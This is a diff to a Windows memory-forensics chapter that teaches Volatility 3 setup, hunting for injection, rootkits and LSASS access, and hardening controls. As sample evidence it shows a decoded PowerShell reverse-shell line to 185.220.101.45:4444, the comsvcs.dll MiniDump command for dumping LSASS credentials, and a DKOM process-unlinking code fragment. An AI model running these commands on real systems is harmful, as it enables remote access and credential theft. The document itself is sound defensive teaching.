@@ -42,6 +42,178 @@ ACQUISITION → ANALYSIS → ARTEFACT IDENTIFICATION → HUNT
 
 ---
 
+## WINDOWS SETUP
+
+Every tool used in this chapter, with exact Windows install commands. Do this
+before anything else. Don't skip the verification step — broken tooling wastes
+hours.
+
+### Tools Required
+
+| Tool | Purpose | Needs Admin? | Needs WSL2? |
+|------|---------|--------------|-------------|
+| WinPMEM | Live memory acquisition | YES | No |
+| Volatility 3 | Memory image analysis | No | No |
+| Python 3.11+ | Runs Volatility 3 | No | No |
+| Git | Clone Volatility repo | No | No |
+| strings (SysInternals) | String extraction from dumps | No | No |
+| WinDbg Preview | Kernel debugging / dump inspection | No | No |
+| Ghidra | Reverse engineering dumped PE files | No | No |
+
+### WSL2 (Required for grep/awk/bash one-liners in this chapter)
+
+Some commands in this chapter use bash utilities (`grep`, `awk`, `strings`).
+They run in WSL2. Install it once:
+
+```powershell
+# Run this in PowerShell as Administrator:
+wsl --install
+# Reboot when prompted. Default distro: Ubuntu.
+```
+
+Verify:
+```powershell
+wsl --status
+# Expected: "Default Distribution: Ubuntu"
+```
+
+### Python 3 — Install First, Get This Right
+
+**WARNING**: On Windows, typing `python` may launch the Microsoft Store stub
+(Python 2 era redirect) or find Python 2. Volatility 3 needs Python 3.8+.
+Do not use bare `python` until you've sorted this out.
+
+```powershell
+# Check what you have:
+python --version
+python3 --version
+py --version
+
+# If none of those show Python 3.x, download from:
+# https://www.python.org/downloads/windows/
+# Tick "Add Python to PATH" during install. Critical.
+
+# After install, verify with the Python Launcher (preferred on Windows):
+py -3 --version
+# Expected output: Python 3.11.x  (or 3.10+, anything 3.8+ works)
+```
+
+### Volatility 3 — Install in a venv (Required)
+
+**DO NOT** `pip install` Volatility into your system Python. Use a virtual
+environment. This isolates dependencies and avoids conflicts.
+
+```powershell
+# Step 1: Pick a home for Volatility and clone it
+mkdir C:\tools
+cd C:\tools
+git clone https://github.com/volatilityfoundation/volatility3
+cd volatility3
+
+# Step 2: Create a virtual environment using the Python 3 launcher
+py -3 -m venv venv
+
+# Step 3: Activate the venv (PowerShell)
+.\venv\Scripts\Activate.ps1
+
+# If you get an execution policy error, run this first (as Admin):
+Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
+
+# Step 4: Upgrade pip inside the venv, then install Volatility
+python -m pip install --upgrade pip
+python -m pip install -e .
+
+# Step 5: Verify
+python vol.py -h
+```
+
+### Expected Output — Volatility install verify
+
+```
+Volatility 3 Framework 2.x.x
+usage: vol.py [-h] [-c CONFIG] [--parallelism ...] [-e EXTEND] [-p PLUGIN_DIRS]
+              [-s SYMBOL_DIRS] [-v] [-l LOG] [-o OUTPUT_DIR] [-q]
+              ...
+```
+
+Failure looks like `python: command not found` — means your venv is not
+activated. Run `.\venv\Scripts\Activate.ps1` again.
+
+Failure looks like `ModuleNotFoundError: No module named 'volatility3'` — means
+you ran `pip install` outside the venv. Reactivate the venv and reinstall.
+
+**Every time you open a new terminal to use Volatility, activate the venv first:**
+```powershell
+cd C:\tools\volatility3
+.\venv\Scripts\Activate.ps1
+```
+
+### WinPMEM — Memory Acquisition Tool
+
+```powershell
+# Download the latest release binary:
+# https://github.com/Velocidex/WinPmem/releases
+# File to grab: winpmem_mini_x64_rc2.exe  (or latest version listed)
+
+# Save to: C:\tools\winpmem\
+# Run as Administrator (right-click → Run as administrator)
+
+# Verify:
+winpmem_mini_x64_rc2.exe --help
+# Expected: Usage information printed to console
+```
+
+**WARNING**: WinPMEM requires Administrator rights. Running it without admin
+produces `Access Denied` on the driver load.
+
+### Strings (SysInternals) — For Raw String Extraction
+
+```powershell
+# Download SysInternals Suite (includes strings.exe):
+# https://learn.microsoft.com/en-us/sysinternals/downloads/strings
+
+# Or install via winget:
+winget install Microsoft.SysinternalsSuite
+
+# strings.exe lands in: C:\Windows\System32\ after winget install
+# OR manually copy strings.exe to C:\tools\
+
+# Verify:
+strings --version
+# Expected: strings v2.x
+```
+
+Note: The bash `strings` command referenced later in this chapter is the
+Linux version inside WSL2. For WSL2:
+```bash
+# In WSL2 terminal:
+sudo apt install binutils -y
+strings --version
+# Expected: GNU strings (binutils) 2.x
+```
+
+### WinDbg Preview
+
+```powershell
+# Install from Microsoft Store (search "WinDbg Preview") or:
+winget install Microsoft.WinDbg
+# No verification command — launch from Start menu
+```
+
+### Ghidra (for analysing dumped PE files)
+
+```powershell
+# Download from: https://ghidra-sre.org/
+# Extract to C:\tools\ghidra\
+# Requires Java 17+: https://adoptium.net/
+
+# Verify Java:
+java --version
+# Expected: openjdk 17.x.x or higher
+```
+
+---
+
 ## Section 1 — Memory Acquisition: Getting The Image
 
 You can't analyse what you don't have. Getting the RAM image onto your
@@ -66,10 +238,25 @@ winpmem_mini_x64_rc2.exe --format aff4 -o memdump.aff4
 # Verify acquisition integrity:
 winpmem_mini_x64_rc2.exe --verify memdump.raw
 
-# SHA256 hash immediately after:
+# SHA256 hash immediately after (two ways — pick one):
 certutil -hashfile memdump.raw SHA256
 Get-FileHash memdump.raw -Algorithm SHA256
 ```
+
+### Expected Output — WinPMEM acquisition
+
+```
+Acquiring memory from 0x0 to 0x800000000 (32768MB)
+....................................[output truncated]
+SHA256: a1b2c3d4e5f6...
+```
+
+Failure looks like `Error: Could not load driver` — means you didn't run
+as Administrator. Right-click the .exe → Run as administrator.
+
+Failure looks like `Not enough disk space` — the output file needs as much
+free space as you have RAM (8GB RAM = 8GB file minimum). Pick a different
+output drive.
 
 **What you get**: Raw physical memory image. Everything — kernel
 structures, user-mode process memory, heap contents, registry hive
@@ -213,16 +400,11 @@ Volatility 3 is the standard. Python-based, open source, symbol-aware.
 Forget Volatility 2 for new Windows targets. Volatility 3 handles symbol
 resolution automatically — no manual `--profile` flag.
 
+**Remember**: every `python vol.py` command below assumes you have already
+activated the venv (`.\venv\Scripts\Activate.ps1`) and are in `C:\tools\volatility3`.
+
 ```
-# Install Volatility 3:
-git clone https://github.com/volatilityfoundation/volatility3
-cd volatility3
-pip install -e .
-
-# Verify:
-python vol.py -h
-
-# Base invocation:
+# Base invocation (run from C:\tools\volatility3 with venv activated):
 python vol.py -f <memory_image> <plugin>
 
 # Windows plugins use windows.* prefix
@@ -234,14 +416,37 @@ python vol.py -f memdump.raw windows.pslist > pslist.txt
 # JSON output (for scripting):
 python vol.py -f memdump.raw windows.pslist --output json > pslist.json
 
-# Get OS info first:
+# Get OS info first — always run this before anything else:
 python vol.py -f memdump.raw windows.info
 python vol.py -f memdump.raw banners.Banners
 ```
 
-Volatility auto-downloads Windows symbol packs from Microsoft Symbol Server.
-First run on a new Windows build takes a few minutes. After that it's cached
-in `~/.cache/volatility3/`.
+### Expected Output — windows.info
+
+```
+Variable        Value
+Kernel Base     0xf80150000000
+DTB             0x1ad000
+Symbols         file:///C:/tools/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/...
+Is64Bit         True
+IsPAE           False
+layer_name      0 WindowsIntel32e
+memory_layer    1 FileLayer
+KdVersionBlock  0xf80150c28400
+Major/Minor     15.19041
+MachineType     34404
+```
+
+Failure looks like `No suitable address space mapping found` — means the image
+file is corrupt or you pointed vol.py at the wrong file. Double-check the path.
+
+Failure looks like `ImportError` or `ModuleNotFoundError` — your venv is not
+activated. Run `.\venv\Scripts\Activate.ps1`.
+
+The first time Volatility runs on an image from a Windows build it hasn't seen,
+it auto-downloads symbol packs from Microsoft Symbol Server. This takes a few
+minutes. After that it caches in `%USERPROFILE%\.cache\volatility3\`. Subsequent
+runs are fast.
 
 ### Plugin: windows.pslist
 
@@ -289,6 +494,19 @@ python vol.py -f memdump.raw windows.pslist --output csv > pslist.csv
 python vol.py -f memdump.raw windows.psscan --output csv > psscan.csv
 ```
 
+### Expected Output — psscan
+
+```
+PID    PPID   ImageFileName   Offset(P)           Threads  Handles  SessionId  Wow64  CreateTime          ExitTime
+4      0      System          0x000000001a0c0040   107      -        -          False  2024-01-15 09:00:00 -
+...
+3412   672    malware.exe     0x000000009f440300   2        -        0          False  2024-01-15 10:19:03 -
+```
+
+Failure looks like the output matching pslist exactly — that means no hidden
+processes were found, which is the expected result on a clean system. It is
+not an error.
+
 **Process in psscan but NOT pslist = rootkit indicator.**
 
 The EPROCESS structure is in physical memory (psscan found it). But the
@@ -324,14 +542,23 @@ Decode it:
 ```python
 import base64
 
-encoded = "JABjAGwAaQBlAG4AdAAgAD0A..."
-# PowerShell uses UTF-16-LE encoding
-decoded = base64.b64decode(encoded).decode('utf-16-le')
-print(decoded)
+encoded = "JABjAGwAaQBlAG4AdAAgAD0A..."    # paste the full base64 string here
 
-# Or from command line:
-# echo <base64> | base64 -d | iconv -f utf-16le
+# PowerShell encodes commands in UTF-16-LE, not standard UTF-8
+decoded = base64.b64decode(encoded).decode('utf-16-le')
+
+print(decoded)    # prints the actual PowerShell command the attacker ran
 ```
+
+### Expected Output — base64 decode
+
+```
+$client = New-Object System.Net.Sockets.TCPClient('185.220.101.45',4444);
+$stream = $client.GetStream();...
+```
+
+Failure looks like `UnicodeDecodeError: 'utf-16-le' codec can't decode` — the
+string isn't standard PowerShell encoding. Try `base64.b64decode(encoded).decode('utf-8')` instead.
 
 **Flags that trigger an immediate hunt:**
 - `-Enc` / `-EncodedCommand` in PowerShell arguments
@@ -367,6 +594,7 @@ That's SMB-based lateral movement — PsExec, Impacket smbexec, or similar.
 
 **Enrich every foreign IP found:**
 ```bash
+# Run this in WSL2 (bash):
 python vol.py -f memdump.raw windows.netscan | awk '{print $5}' | sort -u \
     | grep -v "ForeignAddr\|0.0.0.0\|\*" > foreign_ips.txt
 
@@ -393,7 +621,7 @@ python vol.py -f memdump.raw windows.malfind
 # Filter to specific process:
 python vol.py -f memdump.raw windows.malfind --pid 848
 
-# Dump suspicious regions:
+# Dump suspicious regions to disk for further analysis:
 python vol.py -f memdump.raw windows.malfind --pid 848 --dump
 ```
 
@@ -414,6 +642,16 @@ b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  ........@.......
 Decoded: `4d 5a` = `MZ`. An MZ header in an anonymous RWX region inside
 `svchost.exe` = a PE file was loaded into this process without touching disk.
 This is reflective DLL injection.
+
+### Expected Output — malfind dump
+
+After `--dump`, files appear in the current directory named:
+```
+pid.848.vad.0x7ff9a0000000-0x7ff9a000ffff.dmp
+```
+
+Failure looks like `no output files created` — the process had no
+suspicious VAD regions. Clean result on a clean process. Not an error.
 
 **Common false positives:**
 - .NET JIT-compiled code
@@ -441,6 +679,14 @@ Base           Size       Path
 0x7ff900000000 0x4e000    (no path)                          ← REFLECTIVE LOAD
 ```
 
+### Expected Output — windows.dlllist
+
+Normal: every DLL has a full path under `C:\Windows\System32\` or the
+application directory.
+
+Suspicious: entry with `(no path)` or blank path — a DLL was loaded
+without touching disk. This is the reflective injection footprint.
+
 DLLs with no path in the output were loaded without touching disk.
 The PEB's LDR list shows the module, but there's no disk file to point to.
 This is the reflective injection footprint — after the MZ header in malfind,
@@ -466,6 +712,14 @@ python vol.py -f memdump.raw windows.handles --pid 7240 --types File,Key,Process
 PID    Process      Type      GrantedAccess   Name
 7240   malware.exe  Process   0x1fffff        \Device\...\lsass.exe
 ```
+
+### Expected Output — windows.handles
+
+Normal: processes hold handles to their own modules, registry keys under
+HKCU, and standard system objects.
+
+Suspicious: any process holding a `Process` handle to `lsass.exe` with
+access mask `0x1fffff` or `0x1410`.
 
 A process with a handle to `lsass.exe` with access `0x1fffff`
 (`PROCESS_ALL_ACCESS`) is credential dumping. This is Mimikatz,
@@ -512,8 +766,8 @@ Task Manager, Process Explorer, tasklist — they all use this.
 
 ```c
 // Kernel-mode rootkit code:
-PLIST_ENTRY prev = target_eprocess->ActiveProcessLinks.Blink;
-PLIST_ENTRY next = target_eprocess->ActiveProcessLinks.Flink;
+PLIST_ENTRY prev = target_eprocess->ActiveProcessLinks.Blink;  // node before target
+PLIST_ENTRY next = target_eprocess->ActiveProcessLinks.Flink;  // node after target
 
 prev->Flink = next;   // forward traversal skips the target
 next->Blink = prev;   // backward traversal skips the target
@@ -624,6 +878,14 @@ python vol.py -f memdump.raw windows.vadinfo --pid 848
   FileObject: (None)           ← nothing on disk
 ```
 
+### Expected Output — windows.vadinfo
+
+Normal: hundreds of VAD entries. Most say `Vad` (file-backed) and
+`PAGE_EXECUTE_READ` or `PAGE_READONLY`. A handful of `VadS` entries
+for stack and heap is normal.
+
+Suspicious: `VadS` + `PAGE_EXECUTE_READWRITE` = immediate investigation.
+
 The injection signature:
 - `VadS` tag (anonymous, private memory)
 - `PAGE_EXECUTE_READWRITE` (must be writable to fill, executable to run)
@@ -687,7 +949,7 @@ python vol.py -f memdump.raw windows.malfind > malfind.txt
 python vol.py -f memdump.raw windows.malfind --pid 848 --dump
 # Creates: pid.848.vad.0x7ff9a0000000-0x7ff9a000ffff.dmp
 
-# Analyse the dumped file:
+# Analyse the dumped file (run in WSL2):
 file pid.848.vad.*.dmp
 strings pid.848.vad.*.dmp | grep -iE "http|cmd|pass|inject|load|download"
 # If it's a PE: analyse with Ghidra or Cutter
@@ -746,6 +1008,7 @@ SMB-based C2 and lateral movement uses named pipes. While netscan shows
 TCP/UDP, named pipes appear in handles:
 
 ```
+# Run in WSL2 (uses grep):
 python vol.py -f memdump.raw windows.handles --pid 7240 --types File \
     | grep -i "\\\\pipe\\\\"
 # Named pipes appear as \Device\NamedPipe\<pipename>
@@ -778,17 +1041,28 @@ python vol.py -f memdump.raw windows.registry.hivelist
 # 0xffffd000def0   \REGISTRY\MACHINE\SECURITY
 # 0xffffd0001111   \...\Users\victim\NTUSER.DAT
 
-# Query specific key:
+# Query specific key — check what runs at logon:
 python vol.py -f memdump.raw windows.registry.printkey \
     --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
+# Check installed services:
 python vol.py -f memdump.raw windows.registry.printkey \
     --key "SYSTEM\CurrentControlSet\Services"
 
-# Hunt persistence keys:
+# Hunt debugger hijack persistence:
 python vol.py -f memdump.raw windows.registry.printkey \
     --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
 ```
+
+### Expected Output — windows.registry.printkey
+
+```
+Last Write Time             Subkey  Type    Data    Volatile
+2024-01-15 10:19:03.000000  False   REG_SZ  C:\Users\Public\backdoor.exe  False
+```
+
+Failure looks like `Key not found` — the registry key doesn't exist in
+this image. That's a clean result for that key. Not an error.
 
 **Persistence registry locations to always check:**
 
@@ -835,7 +1109,7 @@ DPAPI MasterKey    DPAPI blob        Mimikatz sekurlsa::dpapi
 **Detecting LSASS credential access:**
 
 ```
-# Check who has handles to lsass.exe:
+# Check who has handles to lsass.exe (run in WSL2 for grep):
 python vol.py -f memdump.raw windows.handles | grep -i "lsass"
 
 # A process with PROCESS_ALL_ACCESS (0x1fffff) handle to lsass.exe:
@@ -846,10 +1120,21 @@ python vol.py -f memdump.raw windows.handles | grep -i "lsass"
 python vol.py -f memdump.raw windows.filescan | grep -i "lsass"
 # If you find lsass.dmp or similar in a temp path — it's already been dumped
 
-# Hunt Mimikatz strings in memory:
+# Hunt Mimikatz strings in memory (run in WSL2):
 python vol.py -f memdump.raw windows.memmap --pid <all_pids> --dump
 strings *.dmp | grep -iE "sekurlsa|mimikatz|wdigest|lsadump"
 ```
+
+### Expected Output — LSASS handle check
+
+Suspicious result:
+```
+PID    Process       HandleValue  Type     GrantedAccess  Name
+4920   injector.exe  0x1c4        Process  0x1fffff       \Device\...\lsass.exe
+```
+
+Clean result: no output from the lsass grep, or only entries where the
+process is `lsass.exe` itself (holding handles to its own objects).
 
 **The comsvcs.dll MiniDump technique** — signed Microsoft binary, no Mimikatz:
 
@@ -857,7 +1142,7 @@ strings *.dmp | grep -iE "sekurlsa|mimikatz|wdigest|lsadump"
 # Attacker runs:
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\loot\lsass.dmp full
 
-# Detection in cmdline:
+# Detection in cmdline (run in WSL2):
 python vol.py -f memdump.raw windows.cmdline | grep -i "minidump\|comsvcs"
 ```
 
@@ -869,7 +1154,9 @@ When structured analysis hits a wall, go raw. Malware configurations,
 C2 URLs, encryption keys, hardcoded IPs — all can appear as plaintext
 in memory.
 
-```
+```bash
+# Run these in WSL2 (they're bash/Linux commands):
+
 # Extract all strings from raw image:
 strings -a -n 8 memdump.raw > strings_ascii.txt
 strings -a -n 8 -e l memdump.raw > strings_unicode.txt    # UTF-16 LE
@@ -878,22 +1165,44 @@ strings -a -n 8 -e l memdump.raw > strings_unicode.txt    # UTF-16 LE
 python vol.py -f memdump.raw windows.memmap --pid 7240 --dump
 strings pid.7240.*.dmp > pid7240_strings.txt
 
-# Filter for indicators:
+# Filter for indicators — URLs:
 grep -iE "https?://[a-zA-Z0-9./_-]+" strings_ascii.txt | sort -u
-grep -iE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{4,5}" strings_ascii.txt
-grep -iE "cmd\.exe|powershell|mshta|wscript|cscript" strings_ascii.txt
-grep -iE "password|passwd|token|secret|apikey|bearer" strings_unicode.txt
-grep -iE "\\\\pipe\\\\" strings_ascii.txt      # named pipes
 
-# Hunt base64 blobs (encoded payloads, keys):
+# Filter for IP:port combos (C2 beacons):
+grep -iE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{4,5}" strings_ascii.txt
+
+# Filter for execution-related strings:
+grep -iE "cmd\.exe|powershell|mshta|wscript|cscript" strings_ascii.txt
+
+# Filter for credential keywords (unicode file for WDigest cleartext):
+grep -iE "password|passwd|token|secret|apikey|bearer" strings_unicode.txt
+
+# Filter for named pipes (C2 comms):
+grep -iE "\\\\pipe\\\\" strings_ascii.txt
+
+# Hunt base64 blobs (encoded payloads, keys) — anything 50+ chars:
 grep -oE "[A-Za-z0-9+/]{50,}={0,2}" strings_ascii.txt | sort -u > b64_candidates.txt
 
-# Decode candidates:
+# Decode candidates — try each one and print if it produces readable output:
 while IFS= read -r line; do
-    decoded=$(echo "$line" | base64 -d 2>/dev/null | strings -n 4)
-    [ -n "$decoded" ] && echo "=== $line ===" && echo "$decoded"
+    decoded=$(echo "$line" | base64 -d 2>/dev/null | strings -n 4)    # decode, then extract strings from binary output
+    [ -n "$decoded" ] && echo "=== $line ===" && echo "$decoded"       # only print if there was readable output
 done < b64_candidates.txt
 ```
+
+### Expected Output — string extraction
+
+```
+=== JABjAGwAaQBlAG4AdAAgAD0A... ===
+$client = New-Object System.Net.Sockets.TCPClient('185.220.101.45',4444)
+```
+
+Failure looks like `strings: command not found` in WSL2 — run
+`sudo apt install binutils -y` to install.
+
+Failure looks like `memdump.raw: No such file` — the path to your dump
+file is wrong. Use the absolute path, e.g. `/mnt/c/evidence/memdump.raw`
+from inside WSL2.
 
 **What you're hunting:**
 - C2 domain names and IP:port combos
@@ -915,34 +1224,54 @@ Automate it. Run it every time. Never skip it.
 # Generate both lists:
 python vol.py -f memdump.raw windows.pslist --output csv > pslist.csv
 python vol.py -f memdump.raw windows.psscan --output csv > psscan.csv
+```
 
-# Python comparison script:
-import csv
+**Python comparison script:**
+
+```python
+import csv    # standard library — no install needed
 
 def load_pids(filename):
+    """Read a Volatility CSV output and return a dict of {PID: process_name}."""
     pids = {}
     with open(filename) as f:
-        reader = csv.DictReader(f)
+        reader = csv.DictReader(f)    # reads the header row automatically
         for row in reader:
             pid = row.get('PID', '').strip()
-            name = row.get('ImageFileName', row.get('Name', '')).strip()
+            name = row.get('ImageFileName', row.get('Name', '')).strip()    # pslist uses 'ImageFileName', psscan may use 'Name'
             if pid:
                 pids[pid] = name
     return pids
 
-pslist_pids = load_pids('pslist.csv')
-psscan_pids = load_pids('psscan.csv')
+pslist_pids = load_pids('pslist.csv')    # what the kernel's linked list sees
+psscan_pids = load_pids('psscan.csv')    # what physical memory scanning sees
 
-# Hidden from pslist = in psscan but NOT pslist:
+# Hidden from pslist = in psscan but NOT pslist — this is DKOM:
 hidden = {pid: name for pid, name in psscan_pids.items() if pid not in pslist_pids}
 for pid, name in hidden.items():
     print(f"[HIDDEN] PID {pid} ({name}) — in psscan, NOT pslist → DKOM rootkit suspected")
 
-# In pslist but not psscan (unusual, may indicate corruption):
+# In pslist but not psscan — unusual, investigate:
 ghost = {pid: name for pid, name in pslist_pids.items() if pid not in psscan_pids}
 for pid, name in ghost.items():
     print(f"[GHOST] PID {pid} ({name}) — in pslist, NOT psscan → investigate")
 ```
+
+### Expected Output — pslist vs psscan comparison
+
+Clean system:
+```
+(no output)
+```
+
+Compromised system with DKOM rootkit:
+```
+[HIDDEN] PID 3412 (backdoor.exe) — in psscan, NOT pslist → DKOM rootkit suspected
+```
+
+Failure looks like `KeyError: 'PID'` — the CSV column names differ between
+Volatility versions. Print `reader.fieldnames` inside the function to see
+what columns are actually present, then fix the `row.get()` calls.
 
 **The three outcomes:**
 
@@ -978,13 +1307,13 @@ python vol.py -f memdump.raw windows.ssdt
 Run this on every memory image. In this order. Every time.
 
 ```
-# 1. OS identification
+# 1. OS identification — know what you're dealing with
 python vol.py -f memdump.raw windows.info
 
 # 2. Process list vs pool scan — rootkit check
 python vol.py -f memdump.raw windows.pslist > pslist.txt
 python vol.py -f memdump.raw windows.psscan > psscan.txt
-diff pslist.txt psscan.txt
+diff pslist.txt psscan.txt    # run in WSL2 — any difference = investigate
 
 # 3. Command lines — what was being executed
 python vol.py -f memdump.raw windows.cmdline
@@ -998,17 +1327,79 @@ python vol.py -f memdump.raw windows.malfind
 # 6. Loaded modules — reflective loads, hijacked DLLs
 python vol.py -f memdump.raw windows.dlllist
 
-# 7. Handles — LSASS access, suspicious file/pipe handles
+# 7. Handles — LSASS access, suspicious file/pipe handles (WSL2 for grep)
 python vol.py -f memdump.raw windows.handles | grep -iE "lsass|\\\\pipe\\\\"
 
 # 8. Registry persistence
 python vol.py -f memdump.raw windows.registry.printkey \
     --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
-# 9. Process-specific string extraction on suspects
+# 9. Process-specific string extraction on suspects (WSL2 for strings/grep)
 python vol.py -f memdump.raw windows.memmap --pid <suspicious_pid> --dump
 strings pid.<suspicious_pid>.*.dmp | grep -iE "http|cmd|pass|inject" > suspect_strings.txt
 ```
+
+---
+
+## DEFENDER TAKEAWAY
+
+You built the attacker's playbook through this chapter. Now apply it Monday
+morning. These are the controls and detections that directly counter everything
+above.
+
+- **Enable Windows Event ID 4656 and 4663 on LSASS** via Group Policy
+  (Audit Object Access → Success + Failure). Any process opening a handle
+  to `lsass.exe` gets logged. Filter for access mask `0x1410` or `0x1fffff`.
+  This fires on Mimikatz, procdump, and the comsvcs.dll technique before
+  they get credentials out.
+
+- **Enable Windows Credential Guard** (Settings → Device Security →
+  Core Isolation → Credential Guard). This moves LSASS into a Hyper-V
+  protected container. Even a process with `PROCESS_ALL_ACCESS` to LSASS
+  gets garbage — the real credential material is in the isolated VM. Kills
+  WDigest cleartext and most Mimikatz modules outright.
+
+- **Watch Event ID 7045** (System log) for new service installs. WinPMEM
+  and most kernel-level acquisition/implant tools register a service to
+  load their driver. A new service with a random or system-mimicking name
+  that appears at 2am is an immediate alert. Set a SIEM rule: Event ID 7045
+  outside business hours or from non-standard service installer paths.
+
+- **Enforce Windows Defender Attack Surface Reduction rule**
+  `56a863a9-875e-4185-98a7-b882c64b5ce5` — "Block credential stealing from
+  the Windows local security authority subsystem." Enabled in block mode,
+  this prevents most LSASS memory reads from non-Microsoft-signed processes.
+  Enable via Intune, GPO, or PowerShell:
+  ```powershell
+  Add-MpPreference -AttackSurfaceReductionRules_Ids 56a863a9-875e-4185-98a7-b882c64b5ce5 `
+      -AttackSurfaceReductionRules_Actions Enabled
+  ```
+
+- **Audit parent-process anomalies with Event ID 4688** (Process Creation,
+  requires audit policy enabled). Log every new process with its parent PID.
+  A SIEM rule that fires when `cmd.exe` or `powershell.exe` has a parent of
+  `svchost.exe` catches webshells and service exploitation in real time.
+  Enable: `auditpol /set /subcategory:"Process Creation" /success:enable`
+
+- **Disable WDigest plaintext credential caching** if it's on. It was
+  default-enabled on Server 2008/2012. Check with:
+  ```powershell
+  Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential
+  # If value is 1 — it's on. Set to 0:
+  Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 0
+  ```
+
+- **Implement memory integrity (HVCI)** — Hypervisor-Protected Code Integrity.
+  Prevents unsigned kernel code from executing. DKOM rootkits that ship a
+  custom kernel driver can't load if their driver isn't signed. Enable via:
+  Settings → Windows Security → Device Security → Core Isolation → Memory Integrity.
+  Warning: some older drivers break with this enabled. Test in staging first.
+
+- **Take periodic memory snapshots of critical servers** using WinPMEM on a
+  schedule, stored off-host. When an incident happens you have a before-state
+  to diff against. Run `windows.pslist`, `windows.netscan`, and `windows.modules`
+  against both snapshots and diff the output. New processes or connections that
+  appeared between snapshots without a corresponding change request are your IOCs.
 
 ---
 
@@ -1029,6 +1420,8 @@ strings pid.<suspicious_pid>.*.dmp | grep -iE "http|cmd|pass|inject" > suspect_s
 | **Process hollowing** | Replacing a legitimate process's code with malicious code after creation |
 | **LSASS** | Local Security Authority Subsystem Service; primary credential material storage |
 | **SSDT hook** | Modification of the System Service Descriptor Table to intercept syscalls |
+| **venv** | Python virtual environment; isolated Python install that keeps Volatility's dependencies from conflicting with system packages |
+| **HVCI** | Hypervisor-Protected Code Integrity; prevents unsigned kernel code from executing, blocks most DKOM rootkit drivers |
 
 ---
 
